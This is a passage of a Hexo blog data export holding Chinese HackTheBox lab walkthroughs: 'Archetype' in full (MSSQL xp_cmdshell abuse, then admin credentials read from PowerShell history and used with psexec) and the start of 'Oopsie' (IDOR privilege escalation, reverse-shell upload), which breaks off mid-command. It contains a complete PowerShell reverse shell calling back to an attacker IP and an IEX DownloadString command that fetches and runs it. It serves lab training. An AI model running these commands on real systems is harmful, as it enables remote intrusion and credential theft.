Options设置为1时，允许修改数据库的高级配置选项\nreconfigure;\t\t\t\t\t\t\t\t\t\t\t\\\\确认上面的操作\nsp_configure;\t\t\t\t\t\t\t\t\t\t\t\\\\查看当前sp_configure配置情况\nEXEC sp_configure 'xp_cmdshell', 1\t\t\t\t\t\t\\\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令\nreconfigure;\t\t\t\t\t\t\t\t\t\t\t\\\\确认上面的操作\nxp_cmdshell \"whoami\" \t\t\t\t\t\t\t\t\t\\\\在靶机上调用cmdshell执行whoami\n```\n\n执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\\sql_svc\n\n![](https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png)\n\n### 获得操作系统普通用户权限\n\n我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；\n\n在桌面新建一个powershell的反弹shell文件shell.ps1（**注意将其中的ip修改为HTB分配的ip**）\n\n代码如下：\n\n```\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.55\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"# \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n```\n\n下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；\n\n因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：\n\n```\npython3 -m http.server 80\n```\n\n![](https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png)\n\n然后开启一个监听端口，用来接收反弹的shell：\n\n```\nnc -lvvp 443\n```\n\n![](https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png)\n\n接着在数据库shell中执行如下命令，反弹shell：\n\n```\nxp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.55/shell.ps1\\\");\"\n```\n\n![](https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png)\n\n### 获取普通用户权限的flag\n\n在nc接收的shell中直接执行下面的命令：\n\n```\ntype C:\\Users\\sql_svc\\Desktop\\user.txt\n```\n\n![](https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png)\n\n### 获取系统权限用户的flag\n\n使用下面的命令来访问PowerShell历史记录文件：\n\n```\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n```\n\n![](https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png)\n\n发现administrator用户登录后将共享文件夹\\Archetype\\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：\n\n```\npsexec.py administrator@10.10.10.27\n```\n\n输入上面获得的密码就可以成功提权\n\n![](https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png)\n\n执行如下命令获得flag：\n\n```\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n```\n\n![](https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png)\n\n\n\n> 参考：\n>\n> https://blog.csdn.net/qq_45951598/article/details/115269502\n","source":"_posts/HackTheBox-Archetype.md","raw":"---\ntitle: HackTheBox-Archetype\ndate: 2021-07-13 17:05:21\ncategories:\n- 渗透测试\ntags:\n- HackTheBox\n---\n\n## 实验环境\n\n![](https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png)\n\n## 实验过程\n\n### 信息收集\n\n#### nmap扫描：\n\n```\nnmap -sC -sV 10.10.10.27\n```\n\n-sC：使用默认脚本进行扫描，等同于–script=default\n-sV：探测开启的端口来获取服务、版本信息\n\n![](https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png)\n\n可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口\n\n#### 445端口匿名访问\n\n测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：\n\n```\nsmbclient -N -L //10.10.10.27/\n```\n\n-N：匿名登录\n-L：获取共享资源列表\n\n![](https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png)\n\n可以看到存在一个backups目录，使用smbclient来访问：\n\n```\nsmbclient -N //10.10.10.27/backups\n```\n\n![](https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png)\n\n发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：\n\n![](https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png)\n\n### impacket工具的使用\n\n> 下载地址：https://github.com/SecureAuthCorp/impacket/tree/master\n\n**安装**：\n\n进入impacket目录，执行：\n\n```\npip install .\n```\n\n![](https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png)\n\n用前面获得的账号和密码登录：\n\n```\nmssqlclient.py sql_svc@10.10.10.27 -windows-auth\n```\n\n![](https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png)\n\n判断当前是否拥有sysadmin权限：\n\n```\nSELECT IS_SRVROLEMEMBER('sysadmin')\n```\n\n![](https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png)\n\n返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行\n\n### 使用数据库调用系统命令\n\n依次写入：\n\n```\nEXEC sp_configure 'Show Advanced Options', 1;\t\t\t\\\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项\nreconfigure;\t\t\t\t\t\t\t\t\t\t\t\\\\确认上面的操作\nsp_configure;\t\t\t\t\t\t\t\t\t\t\t\\\\查看当前sp_configure配置情况\nEXEC sp_configure 'xp_cmdshell', 1\t\t\t\t\t\t\\\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令\nreconfigure;\t\t\t\t\t\t\t\t\t\t\t\\\\确认上面的操作\nxp_cmdshell \"whoami\" \t\t\t\t\t\t\t\t\t\\\\在靶机上调用cmdshell执行whoami\n```\n\n执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\\sql_svc\n\n![](https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png)\n\n### 获得操作系统普通用户权限\n\n我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；\n\n在桌面新建一个powershell的反弹shell文件shell.ps1（**注意将其中的ip修改为HTB分配的ip**）\n\n代码如下：\n\n```\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.55\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"# \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n```\n\n下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；\n\n因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：\n\n```\npython3 -m http.server 80\n```\n\n![](https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png)\n\n然后开启一个监听端口，用来接收反弹的shell：\n\n```\nnc -lvvp 443\n```\n\n![](https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png)\n\n接着在数据库shell中执行如下命令，反弹shell：\n\n```\nxp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.55/shell.ps1\\\");\"\n```\n\n![](https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png)\n\n### 获取普通用户权限的flag\n\n在nc接收的shell中直接执行下面的命令：\n\n```\ntype C:\\Users\\sql_svc\\Desktop\\user.txt\n```\n\n![](https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png)\n\n### 获取系统权限用户的flag\n\n使用下面的命令来访问PowerShell历史记录文件：\n\n```\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n```\n\n![](https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png)\n\n发现administrator用户登录后将共享文件夹\\Archetype\\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：\n\n```\npsexec.py administrator@10.10.10.27\n```\n\n输入上面获得的密码就可以成功提权\n\n![](https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png)\n\n执行如下命令获得flag：\n\n```\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n```\n\n![](https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png)\n\n\n\n> 参考：\n>\n> https://blog.csdn.net/qq_45951598/article/details/115269502\n","slug":"HackTheBox-Archetype","published":1,"updated":"2021-09-29T09:20:11.934Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckupad5tm0001wsvt7v6z61bh","content":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"nmap扫描：\"><a href=\"#nmap扫描：\" class=\"headerlink\" title=\"nmap扫描：\"></a>nmap扫描：</h4><pre><code>nmap -sC -sV 10.10.10.27\n</code></pre>\n<p>-sC：使用默认脚本进行扫描，等同于–script=default<br>-sV：探测开启的端口来获取服务、版本信息</p>\n<p><img src=\"https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png\"></p>\n<p>可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口</p>\n<h4 id=\"445端口匿名访问\"><a href=\"#445端口匿名访问\" class=\"headerlink\" title=\"445端口匿名访问\"></a>445端口匿名访问</h4><p>测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：</p>\n<pre><code>smbclient -N -L //10.10.10.27/\n</code></pre>\n<p>-N：匿名登录<br>-L：获取共享资源列表</p>\n<p><img src=\"https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png\"></p>\n<p>可以看到存在一个backups目录，使用smbclient来访问：</p>\n<pre><code>smbclient -N //10.10.10.27/backups\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png\"></p>\n<p>发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：</p>\n<p><img src=\"https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png\"></p>\n<h3 id=\"impacket工具的使用\"><a href=\"#impacket工具的使用\" class=\"headerlink\" title=\"impacket工具的使用\"></a>impacket工具的使用</h3><blockquote>\n<p>下载地址：<a href=\"https://github.com/SecureAuthCorp/impacket/tree/master\">https://github.com/SecureAuthCorp/impacket/tree/master</a></p>\n</blockquote>\n<p><strong>安装</strong>：</p>\n<p>进入impacket目录，执行：</p>\n<pre><code>pip install .\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png\"></p>\n<p>用前面获得的账号和密码登录：</p>\n<pre><code>mssqlclient.py sql_svc@10.10.10.27 -windows-auth\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png\"></p>\n<p>判断当前是否拥有sysadmin权限：</p>\n<pre><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png\"></p>\n<p>返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行</p>\n<h3 id=\"使用数据库调用系统命令\"><a href=\"#使用数据库调用系统命令\" class=\"headerlink\" title=\"使用数据库调用系统命令\"></a>使用数据库调用系统命令</h3><p>依次写入：</p>\n<pre><code>EXEC sp_configure &#39;Show Advanced Options&#39;, 1;            \\\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项\nreconfigure;                                            \\\\确认上面的操作\nsp_configure;                                            \\\\查看当前sp_configure配置情况\nEXEC sp_configure &#39;xp_cmdshell&#39;, 1                        \\\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令\nreconfigure;                                            \\\\确认上面的操作\nxp_cmdshell &quot;whoami&quot;                                     \\\\在靶机上调用cmdshell执行whoami\n</code></pre>\n<p>执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\\sql_svc</p>\n<p><img src=\"https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png\"></p>\n<h3 id=\"获得操作系统普通用户权限\"><a href=\"#获得操作系统普通用户权限\" class=\"headerlink\" title=\"获得操作系统普通用户权限\"></a>获得操作系统普通用户权限</h3><p>我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；</p>\n<p>在桌面新建一个powershell的反弹shell文件shell.ps1（<strong>注意将其中的ip修改为HTB分配的ip</strong>）</p>\n<p>代码如下：</p>\n<pre><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.55&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;# &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()\n</code></pre>\n<p>下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；</p>\n<p>因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png\"></p>\n<p>然后开启一个监听端口，用来接收反弹的shell：</p>\n<pre><code>nc -lvvp 443\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png\"></p>\n<p>接着在数据库shell中执行如下命令，反弹shell：</p>\n<pre><code>xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\\&quot;http://10.10.14.55/shell.ps1\\&quot;);&quot;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png\"></p>\n<h3 id=\"获取普通用户权限的flag\"><a href=\"#获取普通用户权限的flag\" class=\"headerlink\" title=\"获取普通用户权限的flag\"></a>获取普通用户权限的flag</h3><p>在nc接收的shell中直接执行下面的命令：</p>\n<pre><code>type C:\\Users\\sql_svc\\Desktop\\user.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png\"></p>\n<h3 id=\"获取系统权限用户的flag\"><a href=\"#获取系统权限用户的flag\" class=\"headerlink\" title=\"获取系统权限用户的flag\"></a>获取系统权限用户的flag</h3><p>使用下面的命令来访问PowerShell历史记录文件：</p>\n<pre><code>type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png\"></p>\n<p>发现administrator用户登录后将共享文件夹\\Archetype\\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：</p>\n<pre><code>psexec.py administrator@10.10.10.27\n</code></pre>\n<p>输入上面获得的密码就可以成功提权</p>\n<p><img src=\"https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png\"></p>\n<p>执行如下命令获得flag：</p>\n<pre><code>type C:\\Users\\Administrator\\Desktop\\root.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png\"></p>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/qq_45951598/article/details/115269502\">https://blog.csdn.net/qq_45951598/article/details/115269502</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"nmap扫描：\"><a href=\"#nmap扫描：\" class=\"headerlink\" title=\"nmap扫描：\"></a>nmap扫描：</h4><pre><code>nmap -sC -sV 10.10.10.27\n</code></pre>\n<p>-sC：使用默认脚本进行扫描，等同于–script=default<br>-sV：探测开启的端口来获取服务、版本信息</p>\n<p><img src=\"https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png\"></p>\n<p>可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口</p>\n<h4 id=\"445端口匿名访问\"><a href=\"#445端口匿名访问\" class=\"headerlink\" title=\"445端口匿名访问\"></a>445端口匿名访问</h4><p>测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：</p>\n<pre><code>smbclient -N -L //10.10.10.27/\n</code></pre>\n<p>-N：匿名登录<br>-L：获取共享资源列表</p>\n<p><img src=\"https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png\"></p>\n<p>可以看到存在一个backups目录，使用smbclient来访问：</p>\n<pre><code>smbclient -N //10.10.10.27/backups\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png\"></p>\n<p>发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：</p>\n<p><img src=\"https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png\"></p>\n<h3 id=\"impacket工具的使用\"><a href=\"#impacket工具的使用\" class=\"headerlink\" title=\"impacket工具的使用\"></a>impacket工具的使用</h3><blockquote>\n<p>下载地址：<a href=\"https://github.com/SecureAuthCorp/impacket/tree/master\">https://github.com/SecureAuthCorp/impacket/tree/master</a></p>\n</blockquote>\n<p><strong>安装</strong>：</p>\n<p>进入impacket目录，执行：</p>\n<pre><code>pip install .\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png\"></p>\n<p>用前面获得的账号和密码登录：</p>\n<pre><code>mssqlclient.py sql_svc@10.10.10.27 -windows-auth\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png\"></p>\n<p>判断当前是否拥有sysadmin权限：</p>\n<pre><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png\"></p>\n<p>返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行</p>\n<h3 id=\"使用数据库调用系统命令\"><a href=\"#使用数据库调用系统命令\" class=\"headerlink\" title=\"使用数据库调用系统命令\"></a>使用数据库调用系统命令</h3><p>依次写入：</p>\n<pre><code>EXEC sp_configure &#39;Show Advanced Options&#39;, 1;            \\\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项\nreconfigure;                                            \\\\确认上面的操作\nsp_configure;                                            \\\\查看当前sp_configure配置情况\nEXEC sp_configure &#39;xp_cmdshell&#39;, 1                        \\\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令\nreconfigure;                                            \\\\确认上面的操作\nxp_cmdshell &quot;whoami&quot;                                     \\\\在靶机上调用cmdshell执行whoami\n</code></pre>\n<p>执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\\sql_svc</p>\n<p><img src=\"https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png\"></p>\n<h3 id=\"获得操作系统普通用户权限\"><a href=\"#获得操作系统普通用户权限\" class=\"headerlink\" title=\"获得操作系统普通用户权限\"></a>获得操作系统普通用户权限</h3><p>我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；</p>\n<p>在桌面新建一个powershell的反弹shell文件shell.ps1（<strong>注意将其中的ip修改为HTB分配的ip</strong>）</p>\n<p>代码如下：</p>\n<pre><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.55&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;# &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()\n</code></pre>\n<p>下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；</p>\n<p>因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png\"></p>\n<p>然后开启一个监听端口，用来接收反弹的shell：</p>\n<pre><code>nc -lvvp 443\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png\"></p>\n<p>接着在数据库shell中执行如下命令，反弹shell：</p>\n<pre><code>xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\\&quot;http://10.10.14.55/shell.ps1\\&quot;);&quot;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png\"></p>\n<h3 id=\"获取普通用户权限的flag\"><a href=\"#获取普通用户权限的flag\" class=\"headerlink\" title=\"获取普通用户权限的flag\"></a>获取普通用户权限的flag</h3><p>在nc接收的shell中直接执行下面的命令：</p>\n<pre><code>type C:\\Users\\sql_svc\\Desktop\\user.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png\"></p>\n<h3 id=\"获取系统权限用户的flag\"><a href=\"#获取系统权限用户的flag\" class=\"headerlink\" title=\"获取系统权限用户的flag\"></a>获取系统权限用户的flag</h3><p>使用下面的命令来访问PowerShell历史记录文件：</p>\n<pre><code>type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png\"></p>\n<p>发现administrator用户登录后将共享文件夹\\Archetype\\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：</p>\n<pre><code>psexec.py administrator@10.10.10.27\n</code></pre>\n<p>输入上面获得的密码就可以成功提权</p>\n<p><img src=\"https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png\"></p>\n<p>执行如下命令获得flag：</p>\n<pre><code>type C:\\Users\\Administrator\\Desktop\\root.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png\"></p>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/qq_45951598/article/details/115269502\">https://blog.csdn.net/qq_45951598/article/details/115269502</a></p>\n</blockquote>\n"},{"title":"HackTheBox-Oopsie","date":"2021-08-02T09:05:21.000Z","_content":"\n## 实验环境\n\n![](https://i.loli.net/2021/07/27/Hd9VUzsDhXpJxSb.png)\n\n## 信息收集\n\n**端口扫描：**\n\n```\nnmap -sT -Pn 10.10.10.28\n```\n\n![](https://i.loli.net/2021/07/27/ZD8N9JvCn3Gtkyc.png)\n\n发现80端口开放，在浏览器打开，啥也没有，尝试找登录界面\n\n![](https://i.loli.net/2021/07/27/bexZV7YuQCfHnJW.png)\n\n**目录扫描：**\n\n成功找到登录界面\n\n![](https://i.loli.net/2021/07/27/apWtD5Xlgq4KrkH.png)\n\n在bp中也可以看到登录页的js加载记录\n\n![](https://i.loli.net/2021/07/27/2RtDTbzapGBCWhv.png)\n\n在浏览器打开\n\n![](https://i.loli.net/2021/07/27/5NhiCuwZTcWxtLd.png)\n\n## 实验过程\n\n账号为`admin`，密码是上一题中出现过的`MEGACORP_4dm1n!!`，直接登录，登录后看到有一个上传功能，点击提示需要super admin权限\n\n![](https://i.loli.net/2021/07/27/ExH9yqfplFRc6be.png)\n\n先看一下我们现在账号信息，在url中还可以看到目前的用户id=1\n\n![](https://i.loli.net/2021/07/27/c4GRbMgQoK1pqf9.png)\n\n**再抓包看一下**：\n\nid和user、role对应，可以尝试遍历用户\n\n![](https://i.loli.net/2021/07/27/NQDFYJsuVKjvtUG.png)\n\n**发送到interlude模块**，标记id参数，设置好payload开始爆破\n\n![](https://i.loli.net/2021/07/27/IO7bRopKTVdyeEN.png)\n\n![](https://i.loli.net/2021/07/27/jAMXOz6hqZakGB3.png)\n\n看到id=30的响应包的长度比较大，看一下他的响应包的内容，确认为super admin用户\n\n![](https://i.loli.net/2021/07/27/bH7zidyqvxF3sQL.png)\n\n![](https://i.loli.net/2021/07/27/Z2itEGU1TQspdwe.png)\n\n修改目前用户的user和role值，成功越权到super admin用户\n\n![](https://i.loli.net/2021/07/27/D4Zw8Bkz39QbPyT.png)\n\n![](https://i.loli.net/2021/07/27/EM872nWlGr6Qcux.png)\n\n然后尝试上传shell，同样修改当前用户的user和role值，就可以进行文件上传\n\n![](https://i.loli.net/2021/07/27/qmQXoHtZi2lV1By.png)\n\n直接用kali自带的反弹shell文件，修改好ip和port\n\n![](https://i.loli.net/2021/07/27/dqBTIuL8E36UJXf.png)\n\n注意上传的过程中也要修改当前用户的user和role，改成super admin的值，就可以成功上传\n\n![](https://i.loli.net/2021/07/27/zmrJRpM73eCjV9q.png)\n\n![](https://i.loli.net/2021/07/27/hnu7MqHeKplP8oF.png)\n\n接下来开启一个监听端口来接收反弹的shell\n\n![](https://i.loli.net/2021/07/27/qW8BbmrcNsvJwoP.png)\n\n然后就是要找到我们上传的shell，扫目录的时候有一个uploads的路径，我们上传的文件应该就在这里\n\n**访问上传的shell来执行**\n\n![](https://i.loli.net/2021/07/27/Kcw1hkTyXuig4r9.png)\n\n回到netcat中就可以看到反弹的shell了\n\n![](https://i.loli.net/2021/07/27/TZQSK9vkXonWIfz.png)\n\n拿到shell先看看有没有有用的文件，我们拿到了数据库的账号密码\n\n![](https://i.loli.net/2021/07/28/wFjIotzpmd9gQBC.png)\n\n但是现在的shell是非交互式的，我们接下来要升级到交互的shell，两者的区别如下：\n\n```\n交互式模式就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止\n非交互式模式就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止\n```\n\n```\n用netcat获得的shell是非交互式的，不能传递tab来进行补全，不能使用su、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的shell\n```\n\n逐条键入命令：\n\n\n```\n# 将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容\nSHELL=/bin/bash script -q /dev/null\n# 将netcat暂挂至后台\nCtrl-Z\n# 将本地终端置于原始模式，以免干扰远程终端\nstty raw -echo\n# 将netcat返回到前台，注意：这里不会显示输入的命令\nfg\n# 重置远程终端，经测试也可以不进行此操作\nreset\n# 运行xterm\nxterm\n```\n\n拿到交互的shell我们就可以切换到Robert用户了\n\n![](https://i.loli.net/2021/07/28/EdiQx9hAYpDysSk.png)\n\n**获取普通用户权限的flag**\n\n![](https://i.loli.net/2021/07/28/aEARfWQUJsmChMP.png)\n\n## 权限提升\n\n下面我们就要想办法提权，我们先看看这个组里面有没有特殊权限\n\n```\n# -type f 为查找普通文档，-group bugtracker 限定查找的组为bugtracker，2>/dev/null 将错误输出到黑洞（不显示）\nfind / -type f -group bugtracker 2>/dev/null \n# -al 以长格式方式显示并且显示隐藏文件\nls -al /usr/bin/bugtracker           